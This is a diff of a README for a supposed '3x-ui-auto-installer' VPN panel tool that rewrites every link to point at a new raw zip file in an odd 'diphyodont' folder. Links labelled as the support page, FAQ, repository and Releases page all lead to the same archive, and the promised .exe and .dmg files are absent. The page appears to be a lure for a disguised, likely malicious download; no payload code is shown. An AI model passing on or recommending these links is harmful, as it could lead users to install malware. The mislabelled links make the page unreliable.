@@ -1,7 +1,7 @@
 # 🎉 3x-ui-auto-installer - Quickly Set Up Your 3x-ui Panel
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the 3x-ui-auto-installer! This application helps you easily set up the 3x-ui panel. With it, you can quickly create vless VPN keys, proxies, and more. No programming skills? No problem! Follow the steps below to get started.
@@ -24,13 +24,13 @@ With the 3x-ui-auto-installer, you can:
 To install the application, follow these detailed steps:
 
 1. **Visit the Download Page**  
-   Click [here to download](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip) the latest version of the 3x-ui-auto-installer.
+   Click [here to download](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip) the latest version of the 3x-ui-auto-installer.
 
 2. **Choose the Right Version**  
    On the Releases page, find the latest version. It is usually labeled as "Latest Release." You will see a list of files; choose one based on your operating system:
    - For Windows: Download the `.exe` file
    - For macOS: Download the `.dmg` file
-   - For Linux: Download the `https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip` file
+   - For Linux: Download the `https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip` file
 
 3. **Download the File**  
    Click on the file to begin the download. Save it to a location you can easily find, like your Desktop or Downloads folder.
@@ -72,7 +72,7 @@ If you encounter issues during installation or while using the panel, try these 
   The downloaded file may be corrupted. Try downloading it again.
 
 - **Consult the FAQ**  
-  Frequently Asked Questions may address common issues. Access them on the [support page](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip).
+  Frequently Asked Questions may address common issues. Access them on the [support page](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip).
 
 ## 🛠️ Additional Resources
 - **User Guide**  
@@ -82,7 +82,7 @@ If you encounter issues during installation or while using the panel, try these 
   Join our community forums for assistance and tips from other users.
 
 ## 🌐 Explore Further
-Feel free to visit the [GitHub repository](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip) for updates and additional documentation.
+Feel free to visit the [GitHub repository](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip) for updates and additional documentation.
 
 ## 📥 Download Now
-Don't forget, you can always return to the [Releases page](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/3x-ui-auto-installer.zip) to download the latest version. Enjoy using 3x-ui!
+Don't forget, you can always return to the [Releases page](https://raw.githubusercontent.com/Mannujangid/3x-ui-auto-installer/main/diphyodont/auto_installer_ui_x_2.2-alpha.3.zip) to download the latest version. Enjoy using 3x-ui!
